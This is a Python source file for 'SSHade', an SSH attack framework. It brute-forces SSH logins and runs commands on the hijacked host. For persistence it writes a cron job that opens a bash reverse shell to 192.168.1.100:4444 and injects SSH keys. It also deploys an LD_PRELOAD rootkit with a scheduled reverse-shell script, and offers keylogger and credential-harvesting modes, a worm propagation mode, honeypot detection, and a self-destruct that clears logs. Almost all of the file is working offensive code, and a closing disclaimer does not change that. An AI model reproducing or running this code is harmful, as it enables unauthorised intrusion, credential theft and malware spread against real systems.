#!/usr/bin/env python3
import argparse
import logging
import random
import time
import sys
import os
from typing import Optional, Dict, List
import paramiko
import yaml
from scp import SCPClient
from pathlib import Path
from colorama import init, Fore, Back, Style
from tqdm import tqdm
import threading
from datetime import datetime

from attacks.credharv import CredentialHarvester
from attacks.ssh_discovery import SSHDiscovery
from attacks.ssh_detect import SSHHoneypotDetector
from attacks.rootkit import RootkitDeployer
from core.destruct import self_destruct
from core.guard import start_guard

# my arms hurts lol
init(autoreset=True)

# also whats your fav car 
logging.getLogger("paramiko").setLevel(logging.WARNING)
logging.getLogger("scp").setLevel(logging.WARNING)

class SSHadeUI:
    """User interface with colorful output and progress tracking"""

    @staticmethod
    def print_banner():
        """Display the SSHade banner"""
        banner = (
            f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗\n"
            f"║{Fore.RED}                      SSHade - SSH Attack Framework           {Fore.CYAN}║\n"
            f"║{Fore.YELLOW}                  Advanced SSH Security Testing               {Fore.CYAN}║\n"
            f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
        )
        print(banner)

    @staticmethod
    def print_status(message: str, status_type: str = "info"):
        """Print colored status messages with icons"""
        icons = {
            "info": "ℹ️",
            "success": "✔️",
            "warning": "⚠️",
            "error": "✖️",
            "debug": "🐞"
        }
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "debug": Fore.MAGENTA
        }
        icon = icons.get(status_type, "")
        color = colors.get(status_type, Fore.WHITE)
        print(f"{color}{icon} [{status_type.upper()}] {message}{Style.RESET_ALL}")

    @staticmethod
    def print_progress_bar(iteration: int, total: int, prefix: str = "", suffix: str = ""):
        """Display a progress bar using tqdm"""
        # for me its a porche 911 gt 3 lol
        pass

    @staticmethod
    def print_attack_stats(stats: Dict):
        """Display attack statistics in a formatted table"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.YELLOW}                      Attack Statistics                       {Fore.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}Attempts:{Style.RESET_ALL} {stats.get('attempts', 0):<45} ║")
        print(f"║ {Fore.GREEN}Successes:{Style.RESET_ALL} {stats.get('successes', 0):<44} ║")
        print(f"║ {Fore.YELLOW}Lockouts:{Style.RESET_ALL} {stats.get('lockouts', 0):<44} ║")
        print(f"║ {Fore.RED}Errors:{Style.RESET_ALL} {stats.get('connection_errors', 0):<46} ║")
        print(f"║ {Fore.MAGENTA}Duration:{Style.RESET_ALL} {stats.get('duration', 0):.1f}s{Fore.CYAN:<42} ║")
        print(f"║ {Fore.BLUE}Rate:{Style.RESET_ALL} {stats.get('rate', 0):.1f} attempts/sec{Fore.CYAN:<35} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

class SSHade:
    def __init__(self):
        self.config = self.load_config()
        self.session_id = self.generate_id()
        self.ssh_client = None
        self.current_target = None
        self.credentials = {}
        self.ui = SSHadeUI()
        self.time_start = 0
        self.time_end = 23

    @staticmethod
    def generate_id(length=8) -> str:
        """Generate random session ID"""
        return ''.join(random.choices('abcdef0123456789', k=length))

    def set_time_window(self, start_hour: int, end_hour: int):
        """Set the time window for attack execution"""
        self.time_start = start_hour
        self.time_end = end_hour

    def is_within_time_window(self) -> bool:
        """Check if current time is within the allowed execution window"""
        current_hour = datetime.now().hour
        if self.time_start <= self.time_end:
            # Normal case: start hour is less than or equal to end hour
            return self.time_start <= current_hour <= self.time_end
        else:
            # Wrap-around case: window crosses midnight
            return current_hour >= self.time_start or current_hour <= self.time_end

    def check_time_window(self) -> bool:
        """Check time window and display warning if outside window"""
        if not self.is_within_time_window():
            self.ui.print_status(
                f"Current time ({datetime.now().hour}:00) is outside the allowed execution window "
                f"({self.time_start}:00-{self.time_end}:00). Skipping execution.",
                "warning"
            )
            return False
        return True

    def load_config(self) -> Dict:
        """Load configuration from YAML file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config.yaml')
        try:
            with open(config_path, 'r') as f:
                return yaml.safe_load(f) or {}
        except FileNotFoundError:
            return {
                'default_port': 22,
                'timeout': 10,
                'brute_delay': 2.0,
                'wordlists': {
                    'users': 'data/wordlists/common_users.txt',
                    'passwords': 'data/wordlists/common_pass.txt'
                }
            }

    def auto_enumerate(self):
        """Gather system information by running common commands"""
        self.ui.print_status("Starting system enumeration...", "info")
        commands = [
            "uname -a",
            "whoami",
            "id",
            "hostname",
            "uptime",
            "df -h",
            "ps aux --sort=-%mem | head -n 10"
        ]
        for cmd in commands:
            self.ui.print_status(f"Running: {cmd}", "info")
            output = self.execute_command(cmd)
            if output:
                print(f"{Fore.GREEN}{output}{Style.RESET_ALL}")
            else:
                self.ui.print_status(f"No output for command: {cmd}", "warning")
        self.ui.print_status("Enumeration completed.", "success")

    def interactive_shell(self):
        """Interactive REPL shell after successful SSH login"""
        if not self.ssh_client or not self.current_target:
            self.ui.print_status("No active SSH connection to start shell.", "error")
            return

        prompt = f"{Fore.CYAN}ssh@{self.current_target}{Fore.RESET}$ {Style.RESET_ALL}"

        self.ui.print_status("Entering interactive shell. Type :help for commands.", "info")

        while True:
            try:
                user_input = input(prompt).strip()
                if not user_input:
                    continue

                if user_input.startswith(":"):
                    # Internal commands
                    parts = user_input.split()
                    cmd = parts[0].lower()

                    if cmd in [":exit", ":quit"]:
                        self.ui.print_status("Exiting interactive shell.", "info")
                        break

                    elif cmd == ":help":
                        help_text = (
                            f"{Fore.YELLOW}Available internal commands:{Style.RESET_ALL}\n"
                            ":upload <local_path> <remote_path> - Upload file using SCP\n"
                            ":enumerate - Gather system information\n"
                            ":creds - Show stored credentials\n"
                            ":exit or :quit - Exit the shell\n"
                            ":help - Show this help message"
                        )
                        print(help_text)

                    elif cmd == ":upload":
                        if len(parts) != 3:
                            self.ui.print_status("Usage: :upload <local_path> <remote_path>", "warning")
                            continue
                        local_path, remote_path = parts[1], parts[2]
                        try:
                            with SCPClient(self.ssh_client.get_transport()) as scp:
                                self.ui.print_status(f"Uploading {local_path} to {remote_path}", "info")
                                scp.put(local_path, remote_path)
                                self.ui.print_status("File uploaded successfully", "success")
                        except Exception as e:
                            self.ui.print_status(f"SCP upload failed: {str(e)}", "error")

                    elif cmd == ":enumerate":
                        self.auto_enumerate()

                    elif cmd == ":creds":
                        if self.credentials:
                            print(f"{Fore.YELLOW}Stored credentials:{Style.RESET_ALL}")
                            for host, cred in self.credentials.items():
                                print(f"Host: {host} - User: {cred.get('user')} - Password: {cred.get('password')}")
                        else:
                            self.ui.print_status("No stored credentials available.", "warning")

                    else:
                        self.ui.print_status(f"Unknown internal command: {cmd}", "warning")

                else:
                    # Execute as Linux command
                    output = self.execute_command(user_input)
                    if output:
                        print(f"{Fore.GREEN}{output}{Style.RESET_ALL}")

            except KeyboardInterrupt:
                self.ui.print_status("\nKeyboardInterrupt detected. Type :exit or :quit to exit shell.", "warning")
            except Exception as e:
                self.ui.print_status(f"Error: {str(e)}", "error")

    def connect_ssh(self, host: str, username: str, password: str, port: Optional[int] = None) -> bool:
        """Establish SSH connection"""
        port = port or self.config.get('default_port', 22)
        timeout = self.config.get('timeout', 10)
        
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                host, port=port, username=username, 
                password=password, timeout=timeout,
                banner_timeout=200
            )
            self.current_target = host
            self.credentials[host] = {'user': username, 'password': password}
            return True
        except Exception as e:
            logging.debug(f"Connection failed: {str(e)}")
            return False

    def brute_force(self, host: str, userlist: List[str], passlist: List[str]) -> bool:
        """SSH brute force attack with throttling and progress display"""
        # Check time window before starting attack
        if not self.check_time_window():
            return False
            
        delay = self.config.get('brute_delay', 2.0)
        port = self.config.get('default_port', 22)

        total_attempts = len(userlist) * len(passlist)
        current_attempt = 0

        self.ui.print_status(f"Starting brute force attack against {host}", "info")
        self.ui.print_status(f"Target: {len(userlist)} users × {len(passlist)} passwords = {total_attempts} attempts", "info")

        # this is just a progress bar 
        with tqdm(total=total_attempts, unit="attempts", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
            for user in userlist:
                for password in passlist:
                    current_attempt += 1

                    pbar.set_description(f"Testing {user}:{password[:10]}...")
                    pbar.update(1)

                    try:
                        if self.connect_ssh(host, user.strip(), password.strip(), port):
                            self.ui.print_status(f"SUCCESS! Credentials: {user}:{password}", "success")
                            return True
                    except Exception:
                        continue

                    # i like pizza
                    time.sleep(delay + random.uniform(0, 1))

        self.ui.print_status("Brute force attack completed - no valid credentials found", "warning")
        return False

    def execute_command(self, command: str) -> Optional[str]:
        """Execute command on target"""
        # Check time window before executing command
        if not self.check_time_window():
            return None
            
        if not self.ssh_client:
            self.ui.print_status("No active connection", "error")
            return None
            
        try:
            self.ui.print_status(f"Executing: {command}", "info")
            _, stdout, stderr = self.ssh_client.exec_command(command)
            result = stdout.read().decode().strip()
            if result:
                self.ui.print_status("Command executed successfully", "success")
            return result
        except Exception as e:
            self.ui.print_status(f"Command failed: {str(e)}", "error")
            return None

    def deploy_payload(self, local_path: str, remote_path: str = "/tmp/") -> bool:
        """Upload file via SCP with progress display"""
        # Check time window before deploying payload
        if not self.check_time_window():
            return False
            
        try:
            self.ui.print_status(f"Uploading {local_path} to {remote_path}", "info")
            with SCPClient(self.ssh_client.get_transport()) as scp:
                scp.put(local_path, remote_path)
                self.ui.print_status("File uploaded successfully", "success")
                return True
        except Exception as e:
            self.ui.print_status(f"SCP upload failed: {str(e)}", "error")
            return False

    def establish_persistence(self, key_path: Optional[str] = None) -> bool:
        """Establish persistence via SSH key or cron job"""
        # Check time window before starting attack
        if not self.check_time_window():
            return False
            
        if key_path:
            return self._key_persistence(key_path)
        else:
            return self._cron_persistence()

    def _key_persistence(self, key_path: str) -> bool:
        """Inject SSH key for persistence"""
        try:
            self.ui.print_status("Establishing SSH key persistence", "info")
            # a super cool key
            remote_auth_keys = "~/.ssh/authorized_keys"
            self.execute_command(f"mkdir -p ~/.ssh")
            with open(key_path, 'r') as f:
                pub_key = f.read().strip()
            
            cmd = f"echo '{pub_key}' >> {remote_auth_keys}"
            result = self.execute_command(cmd)
            if result is not None:
                self.ui.print_status("SSH key persistence established", "success")
                return True
            return False
        except Exception as e:
            self.ui.print_status(f"Key persistence failed: {str(e)}", "error")
            return False

    def _cron_persistence(self) -> bool:
        """Establish persistence via cron job"""
        try:
            self.ui.print_status("Establishing cron persistence", "info")
            # good ol presistence 
            cron_cmd = "echo '* * * * * /bin/bash -c \"sleep 30 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"' | crontab -"
            result = self.execute_command(cron_cmd)
            if result is not None:
                self.ui.print_status("Cron persistence established", "success")
                return True
            return False
        except Exception as e:
            self.ui.print_status(f"Cron persistence failed: {str(e)}", "error")
            return False

    def deploy_rootkit(self) -> bool:
        """Deploy C-based rootkit for stealth and persistence"""
        # Check time window before starting attack
        if not self.check_time_window():
            return False
            
        try:
            self.ui.print_status("Deploying C-based rootkit for stealth persistence", "info")
            
            # Compile the rootkit on the attacker's machine
            self.ui.print_status("Compiling rootkit...", "info")
            compile_result = os.system("gcc -fPIC -shared -o /tmp/.rk.so payloads/rootkit.c -ldl 2>/dev/null")
            if compile_result != 0:
                self.ui.print_status("Rootkit compilation failed", "error")
                return False
            
            # Upload the compiled binary via SCP
            self.ui.print_status("Uploading rootkit binary...", "info")
            try:
                with SCPClient(self.ssh_client.get_transport()) as scp:
                    scp.put("/tmp/.rk.so", "/tmp/.rk.so")
                    scp.put("payloads/rootkit.c", "/tmp/.rootkit.c")
                    scp.put("payloads/reverse_shell.sh", "/tmp/.reverse_shell")
                self.ui.print_status("Rootkit binary uploaded successfully", "success")
            except Exception as e:
                self.ui.print_status(f"SCP upload failed: {str(e)}", "error")
                return False
            
            # Execute the rootkit silently on the target
            self.ui.print_status("Executing rootkit on target...", "info")
            try:
                # Make the binaries executable
                self.execute_command("chmod +x /tmp/.rk.so")
                self.execute_command("chmod +x /tmp/.reverse_shell")
                
                # Add to LD_PRELOAD and execute
                self.execute_command("echo /tmp/.rk.so > /tmp/.ld.so.preload")
                self.execute_command("export LD_PRELOAD=/tmp/.rk.so")
                
                # Add persistence through cron
                self.execute_command("echo '* * * * * /tmp/.reverse_shell' | crontab - 2>/dev/null")
                
                self.ui.print_status("Rootkit executed successfully", "success")
                return True
            except Exception as e:
                self.ui.print_status(f"Rootkit execution failed: {str(e)}", "error")
                return False
                
        except Exception as e:
            self.ui.print_status(f"Rootkit deployment error: {str(e)}", "error")
            return False

    def cleanup(self):
        """Clean up connections and artifacts"""
        if self.ssh_client:
            self.ssh_client.close()
            self.ssh_client = None
            self.ui.print_status("Connection cleaned up", "info")

def load_wordlist(path: str) -> List[str]:
    """Load wordlist from file"""
    try:
        with open(path, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        SSHadeUI.print_status(f"Wordlist not found: {path}", "error")
        return []

def main():
    # very cool banner
    SSHadeUI.print_banner()
    
    parser = argparse.ArgumentParser(description="SSHade - SSH Attack Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="SSH port (default: 22)")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-m", "--mode", 
                       choices=["brute", "key", "persist", "exec", "credharv", "discover", "detect", "fingerprint"],
                       help="Attack mode")
    group.add_argument("--fingerprint", action="store_true", help="Run fingerprint mode")
    group.add_argument("--rootkit", action="store_true", help="Deploy rootkit for stealth persistence")
    group.add_argument("--worm", action="store_true", help="Run SSH worm propagation mode")
    
    # brute force thingy
    parser.add_argument("-u", "--users", help="Username wordlist path")
    parser.add_argument("-w", "--passwords", help="Password wordlist path")
    
    # worm mode credentials
    parser.add_argument("--worm-username", help="Username for worm propagation")
    parser.add_argument("--worm-password", help="Password for worm propagation")
    
    # key
    parser.add_argument("-k", "--key", help="SSH private key path")
    
    # just the commands 
    parser.add_argument("-c", "--command", help="Command to execute")
    
    # credendtial harvesting like plants
    parser.add_argument("--credharv-action", choices=["wrapper", "keylogger"], help="Credential harvester action to perform")
    
    # Time-based execution window
    parser.add_argument("--time-start", type=int, default=0, help="Start hour for attack execution window (0-23, default: 0)")
    parser.add_argument("--time-end", type=int, default=23, help="End hour for attack execution window (0-23, default: 23)")
    
    # Self-destruct mechanism
    parser.add_argument("--self-destruct", action="store_true", help="Trigger self-destruct mechanism")
    parser.add_argument("--clear-logs", action="store_true", help="Clear logs during self-destruct")
    parser.add_argument("--fake-reboot", action="store_true", help="Fake system reboot during self-destruct")
    
    args = parser.parse_args()
    
    if args.fingerprint:
        args.mode = "fingerprint"
    
    tool = SSHade()
    tool.set_time_window(args.time_start, args.time_end)
    
    # Start monitoring guard in background
    try:
        start_guard()
    except Exception:
        pass  # Silently fail if guard can't start
    
    # Handle self-destruct command
    if args.self_destruct:
        SSHadeUI.print_status("Triggering self-destruct mechanism...", "warning")
        sshade_files = [
            "sshade.py",
            "core/",
            "attacks/",
            "data/",
            "keys/",
            "loot/",
            "payloads/",
            "post/",
            "utils/",
            "worm/",
            "config.yaml",
            "requierements.txt",
            "README.md"
        ]
        
        # Get full paths
        sshade_root = os.path.dirname(os.path.abspath(__file__))
        files_to_destroy = [os.path.join(sshade_root, f) for f in sshade_files]
        
        success = self_destruct(
            files_to_remove=files_to_destroy,
            clear_logs=args.clear_logs,
            fake_reboot=args.fake_reboot
        )
        
        if success:
            SSHadeUI.print_status("Self-destruct completed successfully", "success")
        else:
            SSHadeUI.print_status("Self-destruct failed", "error")
        return
    
    try:
        SSHadeUI.print_status(f"Target: {args.target}", "info")
        SSHadeUI.print_status(f"Mode: {args.mode}", "info")
        
        if args.mode == "brute":
            users = load_wordlist(args.users or tool.config['wordlists']['users'])
            passwords = load_wordlist(args.passwords or tool.config['wordlists']['passwords'])
            
            SSHadeUI.print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", "info")
            
            if tool.brute_force(args.target, users, passwords):
                SSHadeUI.print_status("SUCCESSFUL LOGIN!", "success")
                SSHadeUI.print_status(f"Credentials: {tool.credentials[args.target]}", "success")
            else:
                SSHadeUI.print_status("Brute force failed", "warning")
                
        elif args.mode == "key" and args.key:
            SSHadeUI.print_status("Key-based authentication not yet implemented", "warning")
            
        elif args.mode == "persist":
            if tool.connect_ssh(args.target, *list(tool.credentials.get(args.target, {}).values())):
                if tool.establish_persistence(args.key):
                    SSHadeUI.print_status("Persistence established", "success")
                else:
                    SSHadeUI.print_status("Failed to establish persistence", "error")
                    
        elif args.mode == "exec" and args.command:
            if tool.connect_ssh(args.target, *list(tool.credentials.get(args.target, {}).values())):
                result = tool.execute_command(args.command)
                if result:
                    SSHadeUI.print_status("Command output:", "info")
                    print(f"{Fore.CYAN}{result}{Style.RESET_ALL}")
                else:
                    SSHadeUI.print_status("Command failed", "error")

        elif args.mode == "credharv":
            if not args.credharv_action:
                SSHadeUI.print_status("Please specify --credharv-action with 'wrapper' or 'keylogger'", "error")
            else:
                # i dont even know what to say
                creds = tool.credentials.get(args.target)
                if not creds:
                    SSHadeUI.print_status("No stored credentials for target. Please login first.", "error")
                else:
                    if tool.connect_ssh(args.target, creds['user'], creds['password'], args.port):
                        harvester = CredentialHarvester(tool.ssh_client)
                        success = False
                        if args.credharv_action == "wrapper":
                            success = harvester.install_ssh_wrapper()
                        elif args.credharv_action == "keylogger":
                            success = harvester.install_keylogger()
                        if success:
                            SSHadeUI.print_status(f"Credential harvester '{args.credharv_action}' installed successfully", "success")
                        else:
                            SSHadeUI.print_status(f"Failed to install credential harvester '{args.credharv_action}'", "error")
                    else:
                        SSHadeUI.print_status("SSH connection failed with stored credentials", "error")

        elif args.mode == "discover":
            discovery = SSHDiscovery(port=args.port or tool.config.get('default_port', 22))
            live_hosts = discovery.scan_network(args.target)
            if live_hosts:
                SSHadeUI.print_status(f"Discovered {len(live_hosts)} SSH hosts:", "success")
                for host in live_hosts:
                    print(f" - {host}")
            else:
                SSHadeUI.print_status("No SSH hosts discovered", "warning")

        elif args.mode == "detect":
            port = args.port or tool.config.get('default_port', 22)
            detector = SSHHoneypotDetector(port=port, timeout=tool.config.get('timeout', 10))
            SSHadeUI.print_status(f"Running honeypot detection on {args.target}:{port}", "info")
            results = detector.detect(args.target)
            if results["honeypot_detected"]:
                SSHadeUI.print_status(f"Honeypot detected: {results.get('honeypot_name', 'unknown')}", "warning")
            else:
                SSHadeUI.print_status("No honeypot detected", "success")
            banner = results.get('banner')
            if banner is None:
                banner = "None"
            SSHadeUI.print_status(f"Banner: {banner}", "info")

            login_response_time = results.get('login_response_time')
            if login_response_time is None:
                login_response_time_str = "None"
            else:
                login_response_time_str = f"{login_response_time:.2f} seconds"
            SSHadeUI.print_status(f"Login response time: {login_response_time_str}", "info")

            SSHadeUI.print_status(f"Suspicious login response time: {results.get('login_response_suspicious')}", "info")
            SSHadeUI.print_status(f"Honeypot file structure detected: {results.get('honeypot_file_structure')}", "info")

        elif args.mode == "fingerprint":
            from attacks.ssh_fingerprint import SSHFingerprint
            port = args.port or tool.config.get('default_port', 22)
            SSHadeUI.print_status(f"Fingerprinting SSH banner on {args.target}:{port}", "info")
            fingerprint = SSHFingerprint(args.target, port=port, timeout=tool.config.get('timeout', 10))
            
            # Run enhanced fingerprinting with vulnerability detection
            scan_results = fingerprint.fingerprint_with_vulnerabilities()
            
            if scan_results['banner']:
                # Display basic banner info
                SSHadeUI.print_status(f"Banner: {scan_results['banner']}", "success")
                parsed = scan_results['parsed']
                SSHadeUI.print_status(f"Parsed Banner Info:", "info")
                SSHadeUI.print_status(f"  Software: {parsed.get('software')}", "info")
                SSHadeUI.print_status(f"  Version: {parsed.get('version')}", "info")
                SSHadeUI.print_status(f"  OS: {parsed.get('os')}", "info")
                
                # Display vulnerability summary
                if scan_results['vulnerability_count'] > 0:
                    SSHadeUI.print_status(f"Found {scan_results['vulnerability_count']} vulnerability(ies)", "warning")
                else:
                    SSHadeUI.print_status("No known vulnerabilities detected", "success")
            else:
                SSHadeUI.print_status("Failed to grab SSH banner", "error")
                
        elif args.rootkit or args.mode == "rootkit":
            # Deploy rootkit for stealth and persistence
            creds = tool.credentials.get(args.target)
            if not creds:
                SSHadeUI.print_status("No stored credentials for target. Please login first.", "error")
            else:
                if tool.connect_ssh(args.target, creds['user'], creds['password'], args.port):
                    if tool.deploy_rootkit():
                        SSHadeUI.print_status("Rootkit deployed successfully for stealth persistence", "success")
                    else:
                        SSHadeUI.print_status("Failed to deploy rootkit", "error")
                else:
                    SSHadeUI.print_status("SSH connection failed with stored credentials", "error")
                    
        elif args.worm:
            # Run SSH worm propagation
            # Import the worm module and run it
            try:
                from worm.worm import SSHWorm
                worm = SSHWorm()
                # Use the target and credentials if provided
                if args.target and args.worm_username and args.worm_password:
                    worm.run(args.target, args.worm_username, args.worm_password, max_depth=3)
                elif args.target and tool.credentials.get(args.target):
                    worm.run(args.target, tool.credentials[args.target]['user'], 
                            tool.credentials[args.target]['password'], max_depth=3)
                else:
                    SSHadeUI.print_status("Please provide a target and credentials for worm propagation", "error")
                    SSHadeUI.print_status("Use --worm-username and --worm-password or ensure target credentials are available", "info")
            except Exception as e:
                SSHadeUI.print_status(f"Worm execution failed: {e}", "error")
                    
    except KeyboardInterrupt:
        SSHadeUI.print_status("Interrupted by user", "warning")
    except Exception as e:
        SSHadeUI.print_status(f"Unexpected error: {e}", "error")
    finally:
        tool.cleanup()

if __name__ == "__main__":
    main()

#Make sure to NOT use this tool to harm anyone in anyway
#Thanks for supporting me check out my github for more tools comming out
